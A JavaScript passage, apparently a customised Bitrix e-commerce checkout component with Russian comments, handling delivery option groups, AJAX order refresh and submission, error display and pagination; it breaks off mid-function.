BX.ready(function(){
    //Автозаполнение полного адреса
    
    //Автозаполнения выбора ПВЗ
    boxberry_map.onclick = function() {
        Console.log('Спасибо');
         if($('#pvz_link').html() != 'Выбрать пункт выдачи'){
            $('[name=ORDER_PROP_99]').val($('#pvz_link').html());
        }   
    };

})


BX.namespace("BX.Sale.OrderAjaxComponent"), function () {
    "use strict";
    BX.Sale && BX.Sale.Input && BX.Sale.Input.Utils && (BX.Sale.Input.Utils.asMultiple = function (value) {
        if (null == value || "" === value) return [];
        if (value.constructor === Array) {
            for (var i = 0, length = value.length, val; i < length;) null == (val = value[i]) || "" === val ? (value.splice(i, 1), --length) : ++i;
            return value.length ? value : [""]
        }
        return [value]
    }), BX.Sale.OrderAjaxComponent = {
        initializePrimaryFields: function () {
            this.BXFormPosting = !1, this.regionBlockNotEmpty = !1, this.locationsInitialized = !1, this.locations = {}, this.cleanLocations = {}, this.locationsTemplate = "", this.pickUpMapFocused = !1, this.options = {}, this.activeSectionId = "", this.firstLoad = !0,this.firstLoadToHide = !0, this.initialized = {}, this.opened = {}, this.mapsReady = !1, this.lastSelectedDelivery = 0, this.deliveryLocationInfo = {}, this.deliveryPagination = {}, this.deliveryCachedInfo = [], this.paySystemPagination = {}, this.validation = {}, this.hasErrorSection = {}, this.pickUpPagination = {}, this.timeOut = {}, this.isMobile = BX.browser.IsMobile(), this.isHttps = "https:" === window.location.protocol, this.orderSaveAllowed = !1, this.socServiceHiddenNode = !1, this.isDeliveryChanged = !1
        }, init: function (parameters) {

            this.initializePrimaryFields();
            this.result = parameters.result || {};
            this.prepareLocations(parameters.locations);
            this.params = parameters.params || {};
            this.signedParamsString = parameters.signedParamsString || "";
            this.siteId = parameters.siteID || "";
            this.ajaxUrl = parameters.ajaxUrl || "";
            this.templateFolder = parameters.templateFolder || "";
            this.defaultBasketItemLogo = this.templateFolder + "/images/product_logo.png";
            this.defaultStoreLogo = this.templateFolder + "/images/pickup_logo.png";
            this.defaultDeliveryLogo = this.templateFolder + "/images/delivery_logo.png";
            this.defaultPaySystemLogo = this.templateFolder + "/images/pay_system_logo.png";
            this.orderBlockNode = BX(parameters.orderBlockId);
            this.totalBlockNode = BX(parameters.totalBlockId);
            this.mobileTotalBlockNode = BX(parameters.totalBlockId + "-mobile");
            this.savedFilesBlockNode = BX("bx-soa-saved-files");
            this.orderSaveBlockNode = BX("bx-soa-orderSave2");
            this.mainErrorsNode = BX("bx-soa-main-notifications");
            this.authBlockNode = BX(parameters.authBlockId);
            this.authHiddenBlockNode = BX(parameters.authBlockId + "-hidden");
            this.basketBlockNode = BX(parameters.basketBlockId);
            this.basketBlockNode = {};
            this.basketHiddenBlockNode = BX(parameters.basketBlockId + "-hidden");
            this.regionBlockNode = BX(parameters.regionBlockId);
            this.regionBlockNode = {};
            this.regionHiddenBlockNode = BX(parameters.regionBlockId + "-hidden");
            this.paySystemBlockNode = BX(parameters.paySystemBlockId);
            this.paySystemHiddenBlockNode = BX(parameters.paySystemBlockId + "-hidden");

            // ключ с маленькой буквы, можно конечно потом проверку делать но зачем
            this.deliveryGroup = {
                // "arya home" : {
                //  "ID": "1",
                //  "NAME" : "Забрать в Магазине Arya Home",
                //  "CHECKED" : "N",
                //  "ELEMENTS" : [],
                // },
                "пвз" : {
                    "ID": "2",
                    "NAME" : "Забрать в пункте выдачи (ПВЗ)",
                    "CHECKED" : "N",
                    "ELEMENTS" : [],
                },
                "курьер" : {
                    "ID": "3",
                    "NAME" : "Доставить курьером",
                    "CHECKED" : "N",
                    "ELEMENTS" : [],
                },
                "экспресс" : {
                    "ID": "4",
                    "NAME" : "Экспресс доставка",
                    "CHECKED" : "N",
                    "ELEMENTS" : [],
                },
                "другое" : {
                    "ID": "5",
                    "NAME" : "Другое",
                    "CHECKED" : "N",
                    "ELEMENTS" : [],
                },
            };
            this.deliveryPropsArray = [];
            this.deliveryPropsReady = [];

            this.deliveryBlockNode = BX(parameters.deliveryBlockId);
            this.deliveryHiddenBlockNode = BX(parameters.deliveryBlockId + "-hidden");
            this.pickUpBlockNode = BX(parameters.pickUpBlockId);
            this.pickUpBlockNode = {};
            this.pickUpHiddenBlockNode = BX(parameters.pickUpBlockId + "-hidden");
            this.propsBlockNode = BX(parameters.propsBlockId);
            this.propsHiddenBlockNode = BX(parameters.propsBlockId + "-hidden");

            if (this.result.SHOW_AUTH)
            {
                this.authBlockNode.style.display = '';
                BX.addClass(this.authBlockNode, 'bx-active');
                this.authGenerateUser = this.result.AUTH.new_user_registration_email_confirmation !== 'Y' && this.result.AUTH.new_user_phone_required !== 'Y';
            }

            if (this.totalBlockNode)
            {
                this.totalInfoBlockNode = this.totalBlockNode.querySelector('.bx-soa-cart-total');
                this.totalGhostBlockNode = this.totalBlockNode.querySelector('.bx-soa-cart-total-ghost');
            }

            this.options.deliveriesPerPage = parseInt(parameters.params.DELIVERIES_PER_PAGE);
            this.options.paySystemsPerPage = parseInt(parameters.params.PAY_SYSTEMS_PER_PAGE);
            this.options.pickUpsPerPage = parseInt(parameters.params.PICKUPS_PER_PAGE);
            this.options.showWarnings = !!parameters.showWarnings;
            this.options.propertyValidation = !!parameters.propertyValidation;
            this.options.priceDiffWithLastTime = !1;
            this.options.pickUpMap = parameters.pickUpMap;
            this.options.propertyMap = parameters.propertyMap;
            this.options.totalPriceChanged = !1;

            if (!this.result.IS_AUTHORIZED || typeof this.result.LAST_ORDER_DATA.FAIL !== 'undefined')
                this.initFirstSection();

            this.initOrder = !0;
            this.initOptions();
            this.editOrder();
            this.bindEvents();

            this.orderBlockNode.removeAttribute("style");
            this.basketBlockScrollCheck();
                        if (this.params.USE_ENHANCED_ECOMMERCE === 'Y')
            {
                this.setAnalyticsDataLayer('checkout');
            }

            if (this.params.USER_CONSENT === 'Y')
            {
                this.initUserConsent();
            }

        }, sendRequest: function (action, actionData) {
            var form;
            this.startLoader() && (this.initOrder = !1, this.firstLoad = !1, "saveOrderAjax" === (action = BX.type.isNotEmptyString(action) ? action : "refreshOrderAjax") ? ((form = BX("bx-soa-order-form")) && (form.querySelector("input[type=hidden][name=sessid]").value = BX.bitrix_sessid()), BX.ajax.submitAjax(BX("bx-soa-order-form"), {
                url: this.ajaxUrl,
                method: "POST",
                dataType: "json",
                data: {
                    via_ajax: "Y",
                    action: "saveOrderAjax",
                    sessid: BX.bitrix_sessid(),
                    SITE_ID: this.siteId,
                    signedParamsString: this.signedParamsString
                },
                onsuccess: BX.proxy(this.saveOrderWithJson, this),
                onfailure: BX.proxy(this.handleNotRedirected, this)
            })) : BX.ajax({
                method: "POST",
                dataType: "json",
                url: this.ajaxUrl,
                data: this.getData(action, actionData),
                onsuccess: BX.delegate((function (result) {
                    switch (result.redirect && result.redirect.length && (document.location.href = result.redirect), this.saveFiles(), action) {
                        case"refreshOrderAjax":
                            this.refreshOrder(result), actionData && actionData["change-profile"] && document.querySelector(".pandd .bx-active .change-info").click();
                            break;
                        case"confirmSmsCode":
                        case"showAuthForm":
                            this.firstLoad = !0, this.refreshOrder(result);
                            break;
                        case"enterCoupon":
                            result && result.order ? (this.deliveryCachedInfo = [], this.refreshOrder(result)) : this.addCoupon(result);
                            break;
                        case"showNextBlock":
                            this.refreshOrder(result), document.querySelector(".pandd .bx-active .change-info").click();
                            break;
                        case"removeCoupon":
                            result && result.order ? (this.deliveryCachedInfo = [], this.refreshOrder(result)) : this.removeCoupon(result)
                    };
                    if(!this.firstLoadToHide){
                        for (var key in this.deliveryGroup) {
                            if($('.deliveries > .bx-soa-pp-company.bx-selected').hasClass("GROUP_"+key)){
                                $('#bx-soa-delivery .bx-soa-pp-item-container2 .bx-soa-pp-company-smalltitle:contains("'+this.deliveryGroup[key]["NAME"]+'")').trigger('click');
                            }
                        }
                    }

                    if(this.firstLoadToHide){
                        $('.deliveries').hide();
                        $('.bx-soa-customer-field[data-property-id-row="56"]').hide();
                            //$('.bx-soa-customer-field[data-property-id-row="26"]').hide();
                        $('.bx-soa-customer-field[data-property-id-row="83"]').hide();
                        $('.bx-soa-customer-field[data-property-id-row="81"]').hide();
                        $('.bx-soa-customer-field[data-property-id-row="82"]').hide();
                        $('.bx-soa-customer-field[data-property-id-row="95"]').hide();
                        $('.bx-soa-customer-field[data-property-id-row="96"]').hide();
                        $('.bx-soa-customer-field[data-property-id-row="53"]').hide();
                    }
                    this.firstLoadToHide = false;
                    setTimeout(function(){
                        $('.bx-soa-pp-item-container2 .bx-selected2').append($('.deliveries'));
                        $('#bx-soa-delivery .bx-soa-pp-company .bx-soa-pp-company.bx-selected').closest(".bx-soa-pp-company").trigger('click');
                    },100);

                    BX.cleanNode(this.savedFilesBlockNode), this.endLoader()
                }), this),
                onfailure: BX.delegate((function () {
                    this.endLoader()
                }), this)
            }))
        }, getData: function (action, actionData) {
            var data = {
                order: this.getAllFormData(),
                sessid: BX.bitrix_sessid(),
                via_ajax: "Y",
                SITE_ID: this.siteId,
                signedParamsString: this.signedParamsString
            };
            return data[this.params.ACTION_VARIABLE] = action, "enterCoupon" !== action && "removeCoupon" !== action || (data.coupon = actionData), data
        }, getAllFormData: function () {
            var form = BX("bx-soa-order-form"), prepared = BX.ajax.prepareForm(form), i;
            for (i in prepared.data) prepared.data.hasOwnProperty(i) && "" == i && delete prepared.data[i];
            return prepared && prepared.data ? prepared.data : {}
        }, refreshOrder: function (result) {
            var fio = $('#soa-property-102').val() + " " + $('#soa-property-103').val();
            $('#soa-property-50').val(fio);
            if (result.error) this.showError(this.mainErrorsNode, result.error), this.animateScrollTo(this.mainErrorsNode, 800, 20); else if (result.order.SHOW_AUTH) {
                var animation = result.order.OK_MESSAGE && result.order.OK_MESSAGE.length || "OK" === result.order.SMS_AUTH.TYPE ? "bx-step-good" : "bx-step-bad";
                this.addAnimationEffect(this.authBlockNode, animation), BX.merge(this.result, result.order), this.editAuthBlock(), this.showAuthBlock(), this.showErrors(result.order.ERROR, !1), this.animateScrollTo(this.authBlockNode)
            } else {
                if (this.isPriceChanged(result), this.isDeliveryChanged ? this.isDeliveryChanged = !1 : this.activeSectionId !== this.deliveryBlockNode.id && (this.deliveryCachedInfo = []), result.order.PAY_CURRENT_ACCOUNT && "Y" === result.order.PAY_CURRENT_ACCOUNT) {
                    var currentPaySystem = this.getSelectedPaySystem();
                    if (currentPaySystem) {
                        var currentPaySystemId = currentPaySystem.ID;
                        if (currentPaySystemId && result.order.PAY_SYSTEM) for (var i in result.order.PAY_SYSTEM) if (result.order.PAY_SYSTEM[i].ID == currentPaySystemId) {
                            result.order.PAY_SYSTEM[i].CHECKED = "Y";
                            break
                        }
                    }
                }
                this.result = result.order, this.prepareLocations(result.locations), this.locationsInitialized = !1, this.maxWaitTimeExpired = !1, this.pickUpMapFocused = !1, this.deliveryLocationInfo = {}, this.initialized = {}, this.couponsCustomInitialized = !1, this.initOptions(), this.editOrder(), this.mapsReady && this.initMaps(), BX.saleOrderAjax && BX.saleOrderAjax.initDeferredControl()
            }
            return !0
        }, saveOrderWithJson: function (result) {
            var redirected = !1;
            result && result.order && ((result = result.order).REDIRECT_URL ? ("Y" === this.params.USE_ENHANCED_ECOMMERCE && this.setAnalyticsDataLayer("purchase", result.ID), redirected = !0, location.href = result.REDIRECT_URL) : result.SHOW_AUTH ? (this.result.SHOW_AUTH = result.SHOW_AUTH, this.result.AUTH = result.AUTH, this.result.SMS_AUTH = result.SMS_AUTH, this.editAuthBlock(), this.showAuthBlock(), this.animateScrollTo(this.authBlockNode)) : this.showErrors(result.ERROR, !0, !0)), redirected || this.handleNotRedirected()
        }, handleNotRedirected: function () {
            this.endLoader(), this.disallowOrderSave()
        }, startLoader: function () {
            return !0 !== this.BXFormPosting && (this.BXFormPosting = !0, this.loadingScreen || (this.loadingScreen = new BX.PopupWindow("loading_screen", null, {
                overlay: {
                    backgroundColor: "white",
                    opacity: 1
                }, events: {
                    onAfterPopupShow: BX.delegate((function () {
                        BX.cleanNode(this.loadingScreen.popupContainer), BX.removeClass(this.loadingScreen.popupContainer, "popup-window"), this.loadingScreen.popupContainer.appendChild(BX.create("IMG", {props: {src: this.templateFolder + "/images/loader.gif"}})), this.loadingScreen.popupContainer.removeAttribute("style"), this.loadingScreen.popupContainer.style.display = "block"
                    }), this)
                }
            }), BX.addClass(this.loadingScreen.overlay.element, "bx-step-opacity")), this.loadingScreen.overlay.element.style.opacity = "0", this.loadingScreen.show(), this.loadingScreen.overlay.element.style.opacity = "0.6", !0)
        }, endLoader: function () {
            this.BXFormPosting = !1, this.loadingScreen && this.loadingScreen.isShown() && this.loadingScreen.close()
        }, htmlspecialcharsEx: function (str) {
            return str.replace(/&amp;/g, "&amp;amp;").replace(/&lt;/g, "&amp;lt;").replace(/&gt;/g, "&amp;gt;").replace(/&quot;/g, "&amp;quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;")
        }, saveFiles: function () {
            if (this.result.ORDER_PROP && this.result.ORDER_PROP.properties) {
                var props = this.result.ORDER_PROP.properties, i, prop;
                for (i = 0; i < props.length; i++) "FILE" == props[i].TYPE && (prop = this.orderBlockNode.querySelector('div[data-property-id-row="' + props[i].ID + '"]')) && this.savedFilesBlockNode.appendChild(prop)
            }
        }, animateScrollTo: function (node, duration, shiftToTop) {
            if (node) {
                var scrollTop = BX.GetWindowScrollPos().scrollTop, orderBlockPos = BX.pos(this.orderBlockNode),
                    ghostTop = BX.pos(node).top - (this.isMobile ? 50 : 0) - 100;
                shiftToTop && (ghostTop -= parseInt(shiftToTop)), new BX.easing({
                    duration: duration || 800,
                    start: {scroll: scrollTop},
                    finish: {scroll: ghostTop},
                    transition: BX.easing.makeEaseOut(BX.easing.transitions.quad),
                    step: BX.delegate((function (state) {
                        window.scrollTo(0, state.scroll)
                    }), this)
                }).animate()
            }
        }, checkKeyPress: function (event) {
            if (13 == event.keyCode) {
                var target = event.target || event.srcElement, send, nextAttr, next;
                if (!target.getAttribute("data-send")) return (nextAttr = target.getAttribute("data-next")) && (next = this.orderBlockNode.querySelector("input[name=" + nextAttr + "]")) && next.focus(), BX.PreventDefault(event)
            }
        }, getSizeString: function (maxSize, len) {
            var gbDivider = 1073741824, mbDivider = 1048576, kbDivider = 1024, str;
            return maxSize = parseInt(maxSize), len = parseInt(len), str = maxSize > gbDivider ? parseFloat(maxSize / gbDivider).toFixed(len) + " Gb" : maxSize > 1048576 ? parseFloat(maxSize / 1048576).toFixed(len) + " Mb" : maxSize > 1024 ? parseFloat(maxSize / 1024).toFixed(len) + " Kb" : maxSize + " B"
        }, getFileAccepts: function (accepts) {
            var arr = [], arAccepts = accepts.split(","), i, currentAccept, mimeTypesMap = {
                json: "application/json",
                javascript: "application/javascript",
                "octet-stream": "application/octet-stream",
                ogg: "application/ogg",
                pdf: "application/pdf",
                zip: "application/zip",
                gzip: "application/gzip",
                aac: "audio/aac",
                mp3: "audio/mpeg",
                gif: "image/gif",
                jpeg: "image/jpeg",
                png: "image/png",
                svg: "image/svg+xml",
                tiff: "image/tiff",
                css: "text/css",
                csv: "text/csv",
                html: "text/html",
                plain: "text/plain",
                php: "text/php",
                xml: "text/xml",
                mpeg: "video/mpeg",
                mp4: "video/mp4",
                quicktime: "video/quicktime",
                flv: "video/x-flv",
                doc: "application/msword",
                docx: "application/msword",
                xls: "application/vnd.ms-excel",
                xlsx: "application/vnd.ms-excel"
            };
            for (i = 0; i < arAccepts.length; i++) currentAccept = mimeTypesMap[currentAccept = BX.util.trim(arAccepts[i])] || currentAccept, arr.push(currentAccept);
            return arr.join(",")
        }, uniqueText: function (text, separator) {
            var phrases, i, output = [];
            for (separator = separator || "<br>", phrases = (text = text || "").split(separator), phrases = BX.util.array_unique(phrases), i = 0; i < phrases.length; i++) "" != phrases[i] && output.push(BX.util.trim(phrases[i]));
            return output.join(separator)
        }, getImageSources: function (item, key) {
            return !!(item && key && item[key]) && {
                src_1x: item[key + "_SRC"],
                src_2x: item[key + "_SRC_2X"],
                src_orig: item[key + "_SRC_ORIGINAL"]
            }
        }, getErrorContainer: function (node) {
            node && node.appendChild(BX.create("DIV", {
                props: {className: "alert alert-danger"},
                style: {display: "none"}
            }))
        }, showError: function (node, msg, border) {
            BX.type.isArray(msg) && (msg = msg.join("<br>"));
            var errorContainer = node.querySelector(".alert.alert-danger"), animate;
            errorContainer && msg.length && (BX.cleanNode(errorContainer), errorContainer.appendChild(BX.create("DIV", {html: msg})), (animate = !this.hasErrorSection[node.id]) ? (errorContainer.style.opacity = 0, errorContainer.style.display = "", new BX.easing({
                duration: 300,
                start: {opacity: 0},
                finish: {opacity: 100},
                transition: BX.easing.makeEaseOut(BX.easing.transitions.quad),
                step: function (state) {
                    errorContainer.style.opacity = state.opacity / 100
                },
                complete: function () {
                    errorContainer.removeAttribute("style")
                }
            }).animate()) : errorContainer.style.display = "", border && BX.addClass(node, "bx-step-error"))
        }, showErrors: function (errors, scroll, showAll) {
            var errorNodes = this.orderBlockNode.querySelectorAll("div.alert.alert-danger"), section, k, blockErrors;
            for (k = 0; k < errorNodes.length; k++) section = BX.findParent(errorNodes[k], {className: "bx-soa-section"}), BX.removeClass(section, "bx-step-error"), errorNodes[k].style.display = "none", BX.cleanNode(errorNodes[k]);
            if (errors && !(BX.util.object_keys(errors).length < 1)) {
                for (k in errors) if (errors.hasOwnProperty(k)) switch (blockErrors = errors[k], k.toUpperCase()) {
                    case"MAIN":
                        this.showError(this.mainErrorsNode, blockErrors), this.animateScrollTo(this.mainErrorsNode, 800, 20), scroll = !1;
                        break;
                    case"AUTH":
                        "none" == this.authBlockNode.style.display ? (this.showError(this.mainErrorsNode, blockErrors, !0), this.animateScrollTo(this.mainErrorsNode, 800, 20), scroll = !1) : this.showError(this.authBlockNode, blockErrors, !0);
                        break;
                    case"REGION":
                        (showAll || "true" === this.regionBlockNode.getAttribute("data-visited")) && (this.showError(this.regionBlockNode, blockErrors, !0), this.showError(this.regionHiddenBlockNode, blockErrors));
                        break;
                    case"DELIVERY":
                        (showAll || "true" === this.deliveryBlockNode.getAttribute("data-visited")) && (this.showError(this.deliveryBlockNode, blockErrors, !0), this.showError(this.deliveryHiddenBlockNode, blockErrors));
                        break;
                    case"PAY_SYSTEM":
                        (showAll || "true" === this.paySystemBlockNode.getAttribute("data-visited")) && (this.showError(this.paySystemBlockNode, blockErrors, !0), this.showError(this.paySystemHiddenBlockNode, blockErrors));
                        break;
                    case"PROPERTY":
                        (showAll || "true" === this.propsBlockNode.getAttribute("data-visited")) && (this.showError(this.propsBlockNode, blockErrors, !0), this.showError(this.propsHiddenBlockNode, blockErrors))
                }
                scroll && this.scrollToError()
            }
        }, showBlockErrors: function (node) {
            var errorNode = node.querySelector("div.alert.alert-danger"), hiddenNode, errors;
            if (errorNode) {
                switch (BX.removeClass(node, "bx-step-error"), errorNode.style.display = "none", BX.cleanNode(errorNode), node.id) {
                    case this.regionBlockNode.id:
                        hiddenNode = this.regionHiddenBlockNode, errors = this.result.ERROR.REGION;
                        break;
                    case this.deliveryBlockNode.id:
                        hiddenNode = this.deliveryHiddenBlockNode, errors = this.result.ERROR.DELIVERY;
                        break;
                    case this.paySystemBlockNode.id:
                        hiddenNode = this.paySystemHiddenBlockNode, errors = this.result.ERROR.PAY_SYSTEM;
                        break;
                    case this.propsBlockNode.id:
                        hiddenNode = this.propsHiddenBlockNode, errors = this.result.ERROR.PROPERTY
                }
                errors && BX.util.object_keys(errors).length && (this.showError(node, errors, !0), this.showError(hiddenNode, errors))
            }
        }, checkNotifications: function () {
            var informer = this.mainErrorsNode.querySelector('[data-type="informer"]'), success, sections, className,
                text, scrollTop, informerPos;
            informer && (this.firstLoad && this.result.IS_AUTHORIZED && void 0 === this.result.LAST_ORDER_DATA.FAIL ? (className = (success = (sections = this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active")).length && "true" == sections[sections.length - 1].getAttribute("data-visited")) ? "success" : "warning", text = (success ? this.params.MESS_SUCCESS_PRELOAD_TEXT : this.params.MESS_FAIL_PRELOAD_TEXT).split("#ORDER_BUTTON#").join(this.params.MESS_ORDER).replace("&lt;br /&gt;", " "), informer.appendChild(BX.create("DIV", {
                props: {className: "row"},
                children: [BX.create("DIV", {
                    props: {className: "col-xs-12"},
                    style: {position: "relative", paddingLeft: "48px"},
                    children: [BX.create("DIV", {props: {className: "icon-" + className}}), BX.create("DIV", {html: text})]
                })]
            })), BX.addClass(informer, "alert alert-" + className), informer.style.display = "") : BX.hasClass(informer, "alert") && (scrollTop = BX.GetWindowScrollPos().scrollTop, informerPos = BX.pos(informer), new BX.easing({
                duration: 300,
                start: {opacity: 100},
                finish: {opacity: 0},
                transition: BX.easing.transitions.linear,
                step: function (state) {
                    informer.style.opacity = state.opacity / 100
                },
                complete: function () {
                    scrollTop > informerPos.top && window.scrollBy(0, -(informerPos.height + 20)), informer.style.display = "none", BX.cleanNode(informer), informer.removeAttribute("class"), informer.removeAttribute("style")
                }
            }).animate()))
        }, checkPreload: function (node) {
            var status;
            switch (node.id) {
                case this.regionBlockNode.id:
                    status = this.result.LAST_ORDER_DATA && this.result.LAST_ORDER_DATA.PERSON_TYPE;
                    break;
                case this.paySystemBlockNode.id:
                    status = this.result.LAST_ORDER_DATA && this.result.LAST_ORDER_DATA.PAY_SYSTEM;
                    break;
                case this.deliveryBlockNode.id:
                    status = this.result.LAST_ORDER_DATA && this.result.LAST_ORDER_DATA.DELIVERY;
                    break;
                case this.pickUpBlockNode.id:
                    status = this.result.LAST_ORDER_DATA && this.result.LAST_ORDER_DATA.PICK_UP;
                    break;
                default:
                    status = !0
            }
            return status
        }, checkBlockErrors: function (node) {
            var hiddenNode, errorNode, showError, showWarning, errorTooltips, i;
            if ((hiddenNode = BX(node.id + "-hidden")) && (showError = (errorNode = hiddenNode.querySelector("div.alert.alert-danger")) && "none" != errorNode.style.display, showWarning = hiddenNode.querySelector("div.alert.alert-warning.alert-show"), !showError)) for (errorTooltips = hiddenNode.querySelectorAll("div.tooltip"), i = 0; i < errorTooltips.length; i++) if ("opened" == errorTooltips[i].getAttribute("data-state")) {
                showError = !0;
                break
            }
            return showError ? BX.addClass(node, "bx-step-error") : showWarning ? BX.addClass(node, "bx-step-warning") : BX.removeClass(node, "bx-step-error bx-step-warning"), !showError
        }, scrollToError: function () {
            var sections = this.orderBlockNode.querySelectorAll("div.bx-soa-section.bx-active"), i, errorNode;
            for (i in sections) if (sections.hasOwnProperty(i) && (errorNode = sections[i].querySelector(".alert.alert-danger")) && "none" != errorNode.style.display) {
                this.animateScrollTo(sections[i]);
                break
            }
        }, showWarnings: function () {
            var sections = this.orderBlockNode.querySelectorAll("div.bx-soa-section.bx-active"),
                currentDelivery = this.getSelectedDelivery(), k, warningString;
            for (k = 0; k < sections.length; k++) BX.removeClass(sections[k], "bx-step-warning"), "false" == sections[k].getAttribute("data-visited") && BX.removeClass(sections[k], "bx-step-completed");
            if (currentDelivery && currentDelivery.CALCULATE_ERRORS ? (BX.addClass(this.deliveryBlockNode, "bx-step-warning"), warningString = "<strong>" + this.params.MESS_DELIVERY_CALC_ERROR_TITLE + "</strong>", this.params.MESS_DELIVERY_CALC_ERROR_TEXT.length && (warningString += "<br><small>" + this.params.MESS_DELIVERY_CALC_ERROR_TEXT + "</small>"), this.showBlockWarning(this.deliveryBlockNode, warningString), this.showBlockWarning(this.deliveryHiddenBlockNode, warningString), this.activeSectionId != this.deliveryBlockNode.id && BX.bind(this.deliveryBlockNode.querySelector(".alert.alert-warning"), "click", BX.proxy(this.showByClick, this))) : BX.hasClass(this.deliveryBlockNode, "bx-step-warning") && this.activeSectionId != this.deliveryBlockNode.id && BX.removeClass(this.deliveryBlockNode, "bx-step-warning"), this.result.WARNING && this.options.showWarnings) for (k in this.result.WARNING) if (this.result.WARNING.hasOwnProperty(k)) switch (k.toUpperCase()) {
                case"DELIVERY":
                    "true" === this.deliveryBlockNode.getAttribute("data-visited") && (this.showBlockWarning(this.deliveryBlockNode, this.result.WARNING[k], !0), this.showBlockWarning(this.deliveryHiddenBlockNode, this.result.WARNING[k], !0));
                    break;
                case"PAY_SYSTEM":
                    "true" === this.paySystemBlockNode.getAttribute("data-visited") && (this.showBlockWarning(this.paySystemBlockNode, this.result.WARNING[k], !0), this.showBlockWarning(this.paySystemHiddenBlockNode, this.result.WARNING[k], !0))
            }
        }, notifyAboutWarnings: function (node) {
            if (BX.type.isDomNode(node)) switch (node.id) {
                case this.deliveryBlockNode.id:
                    this.showBlockWarning(this.deliveryBlockNode, this.result.WARNING.DELIVERY, !0);
                    break;
                case this.paySystemBlockNode.id:
                    this.showBlockWarning(this.paySystemBlockNode, this.result.WARNING.PAY_SYSTEM, !0)
            }
        }, showBlockWarning: function (node, warnings, hide) {
            var errorNode = node.querySelector(".alert.alert-danger"), warnStr = "", i, warningNode,
                existedWarningNodes;
            if (errorNode) {
                if (BX.type.isString(warnings)) warnStr = warnings; else for (i in warnings) warnings.hasOwnProperty(i) && warnings[i] && (warnStr += warnings[i] + "<br>");
                if (!warnStr) return;
                for (i in existedWarningNodes = node.querySelectorAll(".alert.alert-warning")) if (existedWarningNodes.hasOwnProperty(i) && BX.type.isDomNode(existedWarningNodes[i]) && -1 !== existedWarningNodes[i].innerHTML.indexOf(warnStr)) return;
                warningNode = BX.create("DIV", {
                    props: {className: "alert alert-warning" + (hide ? " alert-hide" : " alert-show")},
                    html: warnStr
                }), BX.prepend(warningNode, errorNode.parentNode), BX.addClass(node, "bx-step-warning")
            }
        }, showPagination: function (entity, node) {
            if (node && entity) {
                var pagination, navigation = [], i, pageCounter, active, colorTheme, paginationNode;
                switch (entity) {
                    case"delivery":
                        pagination = this.deliveryPagination;
                        break;
                    case"paySystem":
                        pagination = this.paySystemPagination;
                        break;
                    case"pickUp":
                        pagination = this.pickUpPagination
                }
                if (pagination.pages.length > 1) {
                    for (navigation.push(BX.create("LI", {
                        attrs: {"data-action": "prev", "data-entity": entity},
                        props: {className: "bx-pag-prev"},
                        html: 1 == pagination.pageNumber ? "<span>" + this.params.MESS_NAV_BACK + "</span>" : '<a href=""><span>' + this.params.MESS_NAV_BACK + "</span></a>",
                        events: {click: BX.proxy(this.doPagination, this)}
                    })), i = 0; i < pagination.pages.length; i++) active = (pageCounter = parseInt(i) + 1) == pagination.pageNumber ? "bx-active" : "", navigation.push(BX.create("LI", {
                        attrs: {
                            "data-action": pageCounter,
                            "data-entity": entity
                        },
                        props: {className: active},
                        html: '<a href=""><span>' + pageCounter + "</span></a>",
                        events: {click: BX.proxy(this.doPagination, this)}
                    }));
                    navigation.push(BX.create("LI", {
                        attrs: {"data-action": "next", "data-entity": entity},
                        props: {className: "bx-pag-next"},
                        html: pagination.pageNumber == pagination.pages.length ? "<span>" + this.params.MESS_NAV_FORWARD + "</span>" : '<a href=""><span>' + this.params.MESS_NAV_FORWARD + "</span></a>",
                        events: {click: BX.proxy(this.doPagination, this)}
                    })), colorTheme = this.params.TEMPLATE_THEME || "", paginationNode = BX.create("DIV", {
                        props: {className: "bx-pagination" + (colorTheme ? " bx-" + colorTheme : "")},
                        children: [BX.create("DIV", {
                            props: {className: "bx-pagination-container"},
                            children: [BX.create("UL", {children: navigation})]
                        })]
                    }), node.appendChild(BX.create("DIV", {style: {clear: "both"}})), node.appendChild(paginationNode)
                }
            }
        }, doPagination: function (e) {
            var target = e.target || e.srcElement,
                node = "LI" == target.tagName ? target : BX.findParent(target, {tagName: "LI"}),
                page = node.getAttribute("data-action"), entity = node.getAttribute("data-entity"), pageNum;
            return BX.hasClass(node, "bx-active") ? BX.PreventDefault(e) : ("prev" != page && "next" != page || (pageNum = parseInt(BX.findParent(node).querySelector(".bx-active").getAttribute("data-action")), page = "next" == page ? ++pageNum : --pageNum), "delivery" == entity ? this.showDeliveryItemsPage(page) : "paySystem" == entity ? this.showPaySystemItemsPage(page) : "pickUp" == entity && this.showPickUpItemsPage(page), BX.PreventDefault(e))
        }, showDeliveryItemsPage: function (page) {
            this.getCurrentPageItems("delivery", page);
            var selectedDelivery = this.getSelectedDelivery(), hidden, deliveryItemsContainer, k, deliveryItemNode;
            for (selectedDelivery && selectedDelivery.ID && ((hidden = this.deliveryBlockNode.querySelector("input[type=hidden][name=DELIVERY_ID]")) || (hidden = BX.create("INPUT", {
                props: {
                    type: "hidden",
                    name: "DELIVERY_ID",
                    value: selectedDelivery.ID
                }
            }))), deliveryItemsContainer = this.deliveryBlockNode.querySelector(".bx-soa-pp-item-container"), BX.cleanNode(deliveryItemsContainer), BX.type.isDomNode(hidden) && BX.prepend(hidden, BX.findParent(deliveryItemsContainer)), k = 0; k < this.deliveryPagination.currentPage.length; k++) deliveryItemNode = this.createDeliveryItem(this.deliveryPagination.currentPage[k]), deliveryItemsContainer.appendChild(deliveryItemNode);
            this.showPagination("delivery", deliveryItemsContainer)
        }, showPaySystemItemsPage: function (page) {
            this.getCurrentPageItems("paySystem", page);
            var selectedPaySystem = this.getSelectedPaySystem(), hidden, paySystemItemsContainer, k, paySystemItemNode;
            for (selectedPaySystem && selectedPaySystem.ID && ((hidden = this.paySystemBlockNode.querySelector("input[type=hidden][name=PAY_SYSTEM_ID]")) || (hidden = BX.create("INPUT", {
                props: {
                    type: "hidden",
                    name: "PAY_SYSTEM_ID",
                    value: selectedPaySystem.ID
                }
            }))), paySystemItemsContainer = this.paySystemBlockNode.querySelector(".bx-soa-pp-item-container"), BX.cleanNode(paySystemItemsContainer), BX.type.isDomNode(hidden) && BX.prepend(hidden, BX.findParent(paySystemItemsContainer)), k = 0; k < this.paySystemPagination.currentPage.length; k++) paySystemItemNode = this.createPaySystemItem(this.paySystemPagination.currentPage[k]), paySystemItemsContainer.appendChild(paySystemItemNode);
            this.showPagination("paySystem", paySystemItemsContainer)
        }, showPickUpItemsPage: function (page) {
